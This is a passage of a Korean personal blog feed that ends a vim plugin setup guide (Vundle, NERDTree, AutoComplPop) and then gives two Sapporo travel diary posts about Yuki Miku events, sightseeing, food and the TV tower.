vim의 플러그인은 Vundle을 통해 관리된다. 터미널에 다음의 코드를 입력해서 Vundle을 설치하자.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/gmarik/Vundle.vim.git ~/.vim/bundle/Vundle.vim
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;OS X 유저이고, XCode를 설치한 상태라면 git이 설치되어 있을 것이다. 만약 git이 설치되어 있지 않다고 뜨면 앱스토어에서 XCode를 설치해주자.
그 후, 아래의 코드를 vimrc 파일에 붙여넣는다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;set nocompatible
filetype off
set rtp+=~/.vim/bundle/Vundle.vim
call vundle#begin()
  Plugin &#39;gmarik/Vundle.vim&#39; &quot;required
  Plugin &#39;tpope/vim-fugitive&#39; &quot;required
  Plugin &#39;scrooloose/nerdtree&#39;
  Plugin &#39;AutoComplPop&#39;
call vundle#end()            
filetype plugin indent on &quot; Put your non-Plugin stuff after this line
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p class=&quot;italics&quot; align=&quot;CENTER&quot;&gt;위 코드는 &lt;a href=&quot;http://seohakim.blogspot.kr/2015/02/mac-vim.html&quot;&gt;Seoha Kim 님의 블로그&lt;/a&gt;에서 일부를 참조하였습니다.&lt;/p&gt;

&lt;p&gt;여기서 , &lt;code class=&quot;highlighter-rouge&quot;&gt;call vundle#begin&lt;/code&gt;과 &lt;code class=&quot;highlighter-rouge&quot;&gt;call vundle#end&lt;/code&gt;사이의 공간에 원하는 플러그인을 입력하고 설치하면 된다. 다만, Vundle.vim과 vim-fugitive는 필수적인 플러그인이므로 건드리지 말자.
입력한 플러그인을 설치하기 위해서는,&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;:w
:source %
:PluginInstall
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;을 vim에 차례로 입력해줘야 한다.&lt;/p&gt;

&lt;p&gt;위에서 보이다시피 내가 설치한 Plugin은 우선적으로 두 가지로, NERDTree라는 파일 탐색기 플러그인과, AutoComplPop이라는 자동완성 단어를 팝업으로 띄워 보여주는 플러그인이다. NERDTree는 :NERDTree를 입력하면 실행되며, vimrc 수정을 통해 단축키를 지정할 수 있다. AutoComplPop은 여타 텍스트 에디터처럼, 코딩 중에 단어를 입력하면 추천하는 자동완성을 작은 팝업으로 보여준다.&lt;/p&gt;

&lt;p&gt;이때 NERDTree의 경우 vim을 실행할 때마다 :NERDTree를 입력하거나 단축키를 눌러 줘야 실행되는 번거로움이 있는데, vim의 function과 autocmd 기능을 이용해 vim을 실행하면 NERDTree가 자동으로 켜지게끔 만들 수 있다.&lt;/p&gt;

&lt;p&gt;vimrc에 다음과 같은 코드를 입력하자.vim a&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function! StartUp()
  NERDTree
  wincmd p
endfunction

autocmd VimEnter * call StartUp()
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;autocmd는 vim이 실행되면 StartUp함수를 호출하여 안에 적힌 내용을 실행한다. NERDTree를 먼저 입력하여 NERDTree를 실행하며, wincmd p를 입력하여 커서를 NERDTree에서 vim으로 전환한다. 다시 NERDTree로 커서를 이동시키고 싶다면 vim에 다시금 :wincmd p를 입력하면 된다.&lt;/p&gt;

&lt;p&gt;여기까지 정리한 vimrc 파일은 본인의 &lt;a href=&quot;https://github.com/GAONNR/Dotfiles&quot;&gt;Github&lt;/a&gt;에 올려 두었다. 본 글에서는 두 개의 플러그인만 소개하였으나, 다른 유용한 플러그인들이 많으므로 별도로 검색하고 이용해 보길 권한다.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>삿포로 여행 3일차 - 유키미쿠와 삿포로 팩토리, 삿포로 구도청사와 시계탑, 라면 거리, 스스키노 아이스 월드, 그리고 TV타워</title>
   <link href="https://blog.gaonnr.me/trip/2016/02/06/Sapporo-Trip-3/"/>
   <updated>2016-02-06T00:00:00+09:00</updated>
   <id>https://blog.gaonnr.me/trip/2016/02/06/Sapporo-Trip-3</id>
   <content type="html">&lt;p&gt;오늘은 어제보다 한시간 정도 일찍 기상해서 일정을 시작…하기로 했었는데, 가스 공급의 문제로 숙소에 잠깐 온수가 나오지 않은 덕분에 출발 일정이 1시간 늦어졌다. 그래도 이미 있는 계획을 엎을 수는 없으니, 부랴부랴 일정에 맞춰 움직이기로 했다.&lt;/p&gt;

&lt;p&gt;어찌저찌 유키미쿠 관련 굿즈들을 파는 삿포로 팩토리 홀에 도착.&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
  &lt;img src=&quot;/images/2016_02/06/IMG_20160206_102654.jpg&quot; style=&quot;height: 480px;&quot; /&gt;
  &lt;img src=&quot;/images/2016_02/06/IMG_20160206_115632.jpg&quot; style=&quot;height: 480px;&quot; /&gt;
  &lt;span class=&quot;italics&quot;&gt;삿포로 팩토리 홀.&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;줄이 꽤 길었다. 윗윗 사진에서 보이는 줄이 입구로 바로 들어가는 줄이 아니고, 저기서 두 번을 더 꺾어 들어가야 입구가 나온다. 그 정도로 길었고, 설상가상으로 눈까지 내렸기에 기다리는 것이 꽤 고됐다.&lt;/p&gt;

&lt;p&gt;한 두 시간을 줄을 서서 기다렸을까, 드디어 행사장 안으로 들어갈 수 있었다.&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
  &lt;img src=&quot;/images/2016_02/06/IMG_20160206_124132.jpg&quot; style=&quot;width: 480px;&quot; /&gt;
  &lt;span class=&quot;italics&quot;&gt;행사장 내부. (또) 줄을 서서 유키미쿠 관련 굿즈들을 살 수 있는 창구와, 기업들의 미쿠 관련 부스들이 있었다.&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;유키미쿠 굿즈를 많이 살 계획은 없었는데, 인파에 휘말려 어찌어찌 굿즈 구매 줄 사이에 끼게 되어서, 이대로 아무것도 안 사고 가자니 뻘줌할 것 같아 유키미쿠 스포츠 타월을 하나 샀다. 근데 사실 이걸 어디에 써야 할지는 잘 모르겠다. 원래는 안경수건인 줄 알고 산 건데….&lt;/p&gt;

&lt;p&gt;물건을 산 뒤에는 기업 부스를 둘러봤다. 유키미쿠 인형과 피규어, 스포츠 고글(!!), 미쿠 VR이 전시된 부스들이 있었다. 뭐 볼 게 많이 있었던 건 아니고, 그냥 이런 게 있구나~ 하는 정도로 둘러봤다.&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
  &lt;img src=&quot;/images/2016_02/06/IMG_20160206_123559.jpg&quot; style=&quot;height: 480px;&quot; /&gt;
  &lt;img src=&quot;/images/2016_02/06/IMG_20160206_123623.jpg&quot; style=&quot;width: 480px;&quot; /&gt;
  &lt;img src=&quot;/images/2016_02/06/IMG_20160206_123627.jpg&quot; style=&quot;height: 480px;&quot; /&gt;
  &lt;span class=&quot;italics&quot;&gt;유키미쿠 관련 인형과 피규어들. 나머지 부스는 미처 찍지 못했다. 사실 찍을만한 게 딱히 없기도 했고....&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;삿포로 팩토리 홀을 나온 후엔 바로 앞에 있는 삿포로 팩토리로 향했다. 이곳에도 미쿠미쿠한 것들이 많았다. 자세한 건 사진으로 대신.&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
  &lt;img src=&quot;/images/2016_02/06/IMG_20160206_125100.jpg&quot; style=&quot;width: 480px;&quot; /&gt;
  &lt;span class=&quot;italics&quot;&gt;미쿠 VR...과 키넥트 뭐시기. 들어가 보진 않았다. 그저 일러스트가 이뻐서 한장 찍었다.&lt;/span&gt;
&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
  &lt;img src=&quot;/images/2016_02/06/IMG_20160206_131212.jpg&quot; style=&quot;width: 480px;&quot; /&gt;
  &lt;span class=&quot;italics&quot;&gt;뭔가 무대가 있었다. 나중에 크립톤(미쿠 소속사(?)) 관계자로 보이는 사람이 올라와서 뭐라뭐라 말을 하던데, 알아들을 수 없었다.&lt;/span&gt;
&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
  &lt;img src=&quot;/images/2016_02/06/IMG_20160206_131747.jpg&quot; style=&quot;height: 480px;&quot; /&gt;
  &lt;span class=&quot;italics&quot;&gt;잠깐 쉬면서 먹은 크레페 사진 한 장. 이치고 뭐시기... 하는 크레페였는데, 정확히 기억이 안 난다.&lt;/span&gt;
&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
  &lt;img src=&quot;/images/2016_02/06/IMG_20160206_133256.jpg&quot; style=&quot;height: 480px;&quot; /&gt;
  &lt;img src=&quot;/images/2016_02/06/IMG_20160206_133626.jpg&quot; style=&quot;height: 480px;&quot; /&gt;
  &lt;span class=&quot;italics&quot;&gt;보컬로이드 상들. 미쿠 귀여워요 미쿠.&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;좀 더 안쪽으로 들어가니 치토세 공항에서 봤던 것과 비슷한 유키미쿠 박물관(?)이 있었다.&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
  &lt;img src=&quot;/images/2016_02/06/IMG_20160206_134507.jpg&quot; style=&quot;height: 480px;&quot; /&gt;
  &lt;img src=&quot;/images/2016_02/06/IMG_20160206_134520.jpg&quot; style=&quot;height: 480px;&quot; /&gt;
  &lt;img src=&quot;/images/2016_02/06/IMG_20160206_134528.jpg&quot; style=&quot;height: 480px;&quot; /&gt;
  &lt;span class=&quot;italics&quot;&gt;2016년 버전 유키미쿠 일러스트.&lt;/span&gt;
&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
  &lt;img src=&quot;/images/2016_02/06/IMG_20160206_134700.jpg&quot; style=&quot;width: 480px;&quot; /&gt;
  &lt;img src=&quot;/images/2016_02/06/IMG_20160206_134746.jpg&quot; style=&quot;width: 480px;&quot; /&gt;
  &lt;img src=&quot;/images/2016_02/06/IMG_20160206_134801.jpg&quot; style=&quot;width: 480px;&quot; /&gt;
  &lt;span class=&quot;italics&quot;&gt;역대 유키미쿠 넨도로이드들. 휴대폰 카메라가 안 좋아서 사진이 잘 나오지 않았다. 다음 폰은 꼭 카메라 좋은 걸로 사야지.&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;유키미쿠 관련 관람은 이 정도로 끝내고, 좀 더 현실에 충실한(?) 관광을 하기 위해 이동했다. 먼저 도착한 곳은 삿포로 구도청사였다.&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
  &lt;img src=&quot;/images/2016_02/06/IMG_20160206_142059.jpg&quot; style=&quot;width: 480px;&quot; /&gt;
  &lt;span class=&quot;italics&quot;&gt;삿포로 구도청사의 외부. 고-풍 스러운 건물의 디자인과 그 앞에 있는 귀여운 눈사람이 인상적이다.&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;외관만큼이나 내부도 아주 고급진 건물이었다. 내부는 일종의 박물관화가 되어있었는데, 삿포로의 역대 수장들(?)의 사진들, 삿포로와 교류한 여러 나라의 선물들 등을 볼 수 있었다.&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
  &lt;img src=&quot;/images/2016_02/06/IMG_20160206_143435.jpg&quot; style=&quot;width: 480px;&quot; /&gt;
  &lt;img src=&quot;/images/2016_02/06/IMG_20160206_143836.jpg&quot; style=&quot;height: 480px;&quot; /&gt;
  &lt;img src=&quot;/images/2016_02/06/IMG_20160206_144755.jpg&quot; style=&quot;width: 480px;&quot; /&gt;
  &lt;span class=&quot;italics&quot;&gt;삿포로 구도청사의 내부.&lt;/span&gt;
&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
  &lt;img src=&quot;/images/2016_02/06/Method_Sample.jpg&quot; style=&quot;height: 480px;&quot; /&gt;
  &lt;span class=&quot;italics&quot;&gt;여담이지만, 이 삿포로 구도청사는 애니메이션 &#39;천체의 메소드&#39; 등장인물들의 학교로 나온 곳이라고 한다.&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;다음 목적지는 삿포로 시계탑이었다. 사실 이곳은 크게 기대하고 오진 않았다. 오기 전에 삿포로에 대해 적당히 검색을 해봤었는데, 삿포로 시계탑은 유명하기는 하지만 정작 볼 것은 없는 곳이라는 평이 매우 많았기 때문이었다. 뭐… 실제로 크게 감탄할 만한 것은 없었고, 삿포로의 역사 등등이 기록된 판넬이 전시되어 있었는데, 나는 일본어를 잘 하지 못하니 알아들을 수 없었다.&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
  &lt;img src=&quot;/images/2016_02/06/IMG_20160206_151223.jpg&quot; style=&quot;height: 480px;&quot; /&gt;
  &lt;span class=&quot;italics&quot;&gt;삿포로 시계탑의 외부.&lt;/span&gt;
&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
  &lt;img src=&quot;/images/2016_02/06/IMG_20160206_151527.jpg&quot; style=&quot;height: 480px;&quot; /&gt;
  &lt;span class=&quot;italics&quot;&gt;입장료를 냈더니, 유키미쿠가 인쇄된(!) 입장권과 함께 유키미쿠 파일(!!)을 받았다! 전혀 예상치 못한 곳에서 유키미쿠가 튀어나와 버려서 적잖이 (좋은 의미로) 당황했다.&lt;/span&gt;
&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
  &lt;img src=&quot;/images/2016_02/06/IMG_20160206_153551.jpg&quot; style=&quot;width: 480px;&quot; /&gt;
  &lt;span class=&quot;italics&quot;&gt;뜻밖의 유키미쿠에 너무 감동받아서 방명록에 낙서를 끄적거리고 왔다. 유키미쿠님 흥하세요.&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;시계탑 관광을 마치고, 다들 적당히 배고픈 때여서, 스스키노 역 근처의 라멘 거리로 향했다. 라면 거리라고 해서 엄청 크고 거창했던 것은 아니고, 골목길 하나에 라면집이 모여 있는 정도였다. 창 너머로 적당히 비어 있는 음식점을 찾다가, ‘이치쿠라’라는 라면집 안으로 들어갔다.&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
  &lt;img src=&quot;/images/2016_02/06/IMG_20160206_163107.jpg&quot; style=&quot;width: 480px;&quot; /&gt;
  &lt;span class=&quot;italics&quot;&gt;우리가 택한 라멘집. 왜 이 라멘집을 택했느냐 하면...&lt;/span&gt;
&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
  &lt;img src=&quot;/images/2016_02/06/IMG_20160206_160640.jpg&quot; style=&quot;height: 480px;&quot; /&gt;
  &lt;span class=&quot;italics&quot;&gt;&#39;등-째응&#39;이란 음식을 들어본 적도 먹어본 적도 없기 때문이었다(?). 번역기 오류인 것 같다.&lt;/span&gt;
&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
  &lt;img src=&quot;/images/2016_02/06/IMG_20160206_161135.jpg&quot; style=&quot;width: 480px;&quot; /&gt;
  &lt;span class=&quot;italics&quot;&gt;어쨌든 일본, 그 중에서도 라멘거리의 음식점 답게 라멘은 상당히 맛있었다. 한국에서 먹던 것과는 확연히 다른 맛....&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;밥을 다 먹고 어슬렁어슬렁 걷다 보니, 얼음으로 만든 조각상들이 보이기 시작했다. ‘스스키노 아이스 월드’라는 축제의 작품들인 듯 했다. 마침 해도 져 있겠다, 투명한 얼음조각들이 조명을 받으니 참으로 예뻤다.&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
  &lt;img src=&quot;/images/2016_02/06/IMG_20160206_185143.jpg&quot; style=&quot;width: 480px;&quot; /&gt;
  &lt;span class=&quot;italics&quot;&gt;얼음 조각들이 거리를 따라 늘어서 있었다.&lt;/span&gt;
&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
  &lt;img src=&quot;/images/2016_02/06/IMG_20160206_185251.jpg&quot; style=&quot;width: 480px;&quot; /&gt;
  &lt;span class=&quot;italics&quot;&gt;예전에도 이거랑 비슷한 컨셉의 작품이 있었다는 걸 인터넷에서 봤다. 그 때는 물고기에서 핏물이 뚝뚝 떨어져서 호러스러웠다고 하던데, 이번에는 뭐 해결을 해서 전시했겠지...?&lt;/span&gt;
&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
  &lt;img src=&quot;/images/2016_02/06/IMG_20160206_185339.jpg&quot; style=&quot;width: 480px;&quot; /&gt;
  &lt;span class=&quot;italics&quot;&gt;이 축제의 홍보 캐릭터인가 보다. 꽤 귀여웠다. 유키미쿠랑 콜라보레이션을 해도 좋겠다는 생각을 잠깐 했다.&lt;/span&gt;
&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
  &lt;img src=&quot;/images/2016_02/06/IMG_20160206_185359.jpg&quot; style=&quot;width: 480px;&quot; /&gt;
  &lt;span class=&quot;italics&quot;&gt;참...이슬...이라고...?&lt;/span&gt;
&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
  &lt;img src=&quot;/images/2016_02/06/IMG_20160206_185509.jpg&quot; style=&quot;width: 480px;&quot; /&gt;
  &lt;img src=&quot;/images/2016_02/06/IMG_20160206_185555.jpg&quot; style=&quot;height: 480px;&quot; /&gt;
  &lt;span class=&quot;italics&quot;&gt;기타 조각상들.&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;오늘의 라스트 목적지는 TV타워. 예전에 도쿄에 놀러갔을 때 도쿄도청 전망대에서 경치를 보지 못한 한이 있었기 때문에, 이번에는 야경을 잘 보고 오자고 마음먹었다.&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
  &lt;img src=&quot;/images/2016_02/06/IMG_20160206_191321.jpg&quot; style=&quot;height: 480px;&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;그런데 입장료가 꽤 비쌌다. 성인 8천원, 고교생 6천원? 정도였던 것 같다. 고작 타워 주제에 대체 얼마나 볼거리가 있길래 이정도로 입장료를 많이 받아먹나 생각했다.&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
  &lt;img src=&quot;/images/2016_02/06/IMG_20160206_194544.jpg&quot; style=&quot;height: 480px;&quot; /&gt;
  &lt;span class=&quot;italics&quot;&gt;이 거꾸로 된 당근같은 아저씨는 뭐지 했는데 아마 TV타워를 캐릭터화한 것 같다. 왠지 나도 할 수 있을 것 같은 디자인이다.&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;줄을 서서 어찌어찌 입장권을 샀지만 안에도 줄이 길었다. 그나마 다행이었던 것은 사람들이 들어갔다 나오는 게 빠른 편이라서, 줄이 비교적 쑥쑥 줄어들었다는 것이다. 한 15분 정도 서서 기다렸을까, 엘리베이터를 타고 TV타워의 맨 꼭대기로 올라갈 수 있었다. 자 이제 야경을 구경할 수 있게 되었는데,&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
우와아앙?
&lt;br /&gt;
&lt;/p&gt;

&lt;p&gt;야경이 저어어엉말 예뻤다. 이 야경의 1/10이라도 담아 보고자 열심히 폰카메라의 셔터를 눌러 댔지만 도저히 담을 수 없었다. 만약 이 글을 보는 사람 중 삿포로에 여행가는 사람이 있다면, 돈이 아깝다고 생각하지 말고 TV타워만큼은 꼭 올라가 보길 권한다. 야경을 보는 순간 티켓 값은 잊어버리리라고 자신한다. 그 정도로 예뻤다.&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
  &lt;img src=&quot;/images/2016_02/06/IMG_20160206_200246.jpg&quot; style=&quot;height: 480px;&quot; /&gt;
  &lt;img src=&quot;/images/2016_02/06/IMG_20160206_200001.jpg&quot; style=&quot;height: 480px;&quot; /&gt;
  &lt;img src=&quot;/images/2016_02/06/IMG_20160206_200021.jpg&quot; style=&quot;width: 480px;&quot; /&gt;
  &lt;img src=&quot;/images/2016_02/06/IMG_20160206_200119.jpg&quot; style=&quot;height: 480px;&quot; /&gt;
  &lt;span class=&quot;italics&quot;&gt;(맨눈으로 보면)정말 이쁜 야경. 다음 폰은 카메라가 좋아야겠다는 생각이 다시금 들었다.&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;연신 감탄사를 연발하며 야경 관광을 끝내니, 엘리베이터로 내려가는 출구와 계단으로 내려가는 출구 중 하나를 선택하는 옵션이 있었다. 그때는 마냥 기분이 좋아서 계단으로 내려가기로 했는데, 몇 계단을 내려가자마자 ‘음…이건 좀 아니다’라는 생각이 들었다. 춥고, 좀 바람도 많이 불었다…. 만약 타워에 오는 사람이 있다면 내려갈 때는 꼭 엘리베이터를 쓰세요.&lt;/p&gt;

&lt;p&gt;아래에 내려가니 휴게실? 로비? 같은 곳 안에 가챠(뽑기)가 있었다. 다른 가챠였으면 그냥 무시하고 지나갔겠지만…. 이럴 수가! 가챠 품목 중 유키미쿠가 있는 것이 아닌가. 나는 당장 주머니에서 동전을 꺼내 가챠를 돌렸지만…&lt;br /&gt;
실패했다.
같이 가챠를 돌렸던 친구들은 다 나왔지만, 나만 유키미쿠를 획득하지 못했다…. 한끼 식사값을 가챠로 날려버렸는데도, 얻지 못했다. 눈물을 흘리는 심장을 부여잡고, 나는 그렇게 유키미쿠를 얻지 못한 채 타워를 내려가야 했다.&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
  &lt;img src=&quot;/images/2016_02/06/IMG_20160206_203300.jpg&quot; style=&quot;height: 480px;&quot; /&gt;
  &lt;span class=&quot;italics&quot;&gt;너무 마음이 아픈 나머지, 김이 서린 창문에 미쿠를 그리고 떠났다. 다른 창문에도 뭔가 이것저것 많이 그려져 있더라.&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;그 후 숙소에 도착. 친구들과 놀다가 취침했다. 뭔가 제대로 여행한다는 느낌이 들었던 날이었지만, 동시에 얻지 못한 가챠 때문에 마음이 아픈 날이기도 했다….&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>삿포로 여행 2일차 - 스스키노 역, 스프카레, 애니메이트와 멜론북스 등등, 그리고 징기스칸</title>
   <link href="https://blog.gaonnr.me/trip/2016/02/05/Sapporo-Trip-2/"/>
   <updated>2016-02-05T00:00:00+09:00</updated>
   <id>https://blog.gaonnr.me/trip/2016/02/05/Sapporo-Trip-2</id>
   <content type="html">&lt;p&gt;삿포로 여행 2일차. 오늘은 스스키노 역 주변을 다녀왔다.&lt;/p&gt;

&lt;p&gt;원래는 지하철을 타고 가려고 했는데, 리듬게임에 인생을 바친 한 친구가 이미 역 근처의 오락실(= 타이토 게임센터) 위치를 알아놓은 덕분에 걸어갈 수 있었다.&lt;/p&gt;

&lt;p&gt;첫 번째 목적지는 타이토 게임 스테이션이었다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016_02/05/IMG_20160205_113053.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;italics&quot;&gt;타이토 게임센터 외부.&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;게임 스테이션이니 당연히 리듬게임들을 했다. 유비트나 사운드 볼텍스 같은 건 한국에서 지겹게 볼 수 있으니, 한국에서 많이 볼 수 없는 게임 위주로 했다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016_02/05/IMG_20160205_104302.jpg&quot; alt=&quot;&quot; /&gt; &lt;img src=&quot;/images/2016_02/05/IMG_20160205_112215.jpg&quot; alt=&quot;&quot; /&gt; &lt;img src=&quot;/images/2016_02/05/IMG_20160205_110235.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;italics&quot;&gt;순서대로 프로젝트 디바, 뮤제카, 츄니즘.&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;한국에서는 한 판이 500원인 경우가 많은데, 여기는 대부분 한 판에 100엔 단위였다.&lt;/p&gt;

&lt;p&gt;사진에서 보듯이 프로젝트 디바, 뮤제카, 츄니즘 이 세 게임을 주로 플레이했는데, 개인적으로 츄니즘을 제일 재미있게 플레이했다.&lt;/p&gt;

&lt;p&gt;타이토 게임센터에서 제일 인상 깊었던 부분은 화장실이었다. 화장실을 어떻게 이용해야 하는지 픽토그램으로 설명이 되어 있었는데, 이런 것까지 굳이 알려줘야만 하는 건가 하는 생각이 들었었다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016_02/05/IMG_20160205_102836.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;italics&quot;&gt;문제의 그 화장실 픽토그램. 화장실에서 취해서는 안될 온갖 자세들이 그려져 있다.&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;점심으로는 스프카레를 먹으러 갔다. 이 근방에서 가장 유명한 집이라고 하더라. 실제로 줄이 엄청 길어서 한 시간을 기다려서야 입장할 수 있었다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016_02/05/IMG_20160205_122416.jpg&quot; alt=&quot;&quot; /&gt; &lt;img src=&quot;/images/2016_02/05/IMG_20160205_123736.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;italics&quot;&gt;스프카레 집에 입장.&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;스프카레라는 음식을 처음 먹어봤는데, 흔히 생각하는 카레처럼 걸쭉하지 않고 마치 국처럼 흘러내리는 것이 특징이었다. 그래서 스프카레인가 보다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016_02/05/IMG_20160205_125404.jpg&quot; alt=&quot;&quot; /&gt; &lt;img src=&quot;/images/2016_02/05/IMG_20160205_125441.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;italics&quot;&gt;메뉴로는 치킨카레를 골랐다. 매운맛은 3/5단계였는데, 그닥 맵진 않았다.&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;이후 들른 곳은 애니메이트이다. 이름에서 유추할 수 있듯이, 애니메이션 관련 굿즈를 파는 스토어다. 비단 애니메이트뿐만이 아니라, 같은 건물에 있는 여러 애니메이션 관련 굿즈 스토어를 들러 구경했다. 자세한 설명은 사진을 통해서 대신하겠다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016_02/05/IMG_20160205_153211.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;italics&quot;&gt;오늘 들른 곳들.&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016_02/05/IMG_20160205_132550.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;italics&quot;&gt;유키미쿠 관련 잡지. 삿포로 어디를 가든 유키미쿠의 인기를 실감할 수 있었다.&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016_02/05/IMG_20160205_132542.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;italics&quot;&gt;개인적으로 이번 분기에서 (아직까지는)제일 명작이라고 생각하는 작품 [나만이 없는 거리]의 관련 굿즈들.&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016_02/05/IMG_20160205_133555.jpg&quot; alt=&quot;&quot; /&gt; &lt;img src=&quot;/images/2016_02/05/IMG_20160205_134054.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;italics&quot;&gt;타블렛 체험 부스가 있길래 슬쩍 사용해봤다. 왜 다들 큰 타블렛을 사는지 실감했다.&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016_02/05/IMG_20160205_140628.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;italics&quot;&gt;보카로의 인기가 죽어도 식을 줄 모르는 미쿠의 인기는 언제까지 지속될 것인가?&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016_02/05/IMG_20160205_142206.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;italics&quot;&gt;왜 오리지널 미쿠(오른쪽)보다 미쿠다요(왼쪽)가 더 비싼 걸까.&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016_02/05/IMG_20160205_194621.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;italics&quot;&gt;결국은 하나를 업어왔다. 우훗 이것은 좋은 잡지다.&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;그렇게 수 시간 정도를 보내고, 슬슬 발이 아파서 버틸 수 없을 무렵에 저녁을 먹으러 갔다. 저녁 메뉴는 바로 징기즈칸. 양고기를 구워 먹는 음식이라고 한다.&lt;/p&gt;

&lt;p&gt;이번에도 징기스칸 맛집으로 유명한 곳을 갔다. 당연하게도 줄이 길게 서 있었다. 이번에도 추운 날씨 속에서 한시간을 기다려 겨우 먹을 수 있었다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016_02/05/IMG_20160205_173800.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;italics&quot;&gt;가는 길에 찍은 스스키노시의 야경.&lt;/span&gt;&lt;/p&gt;

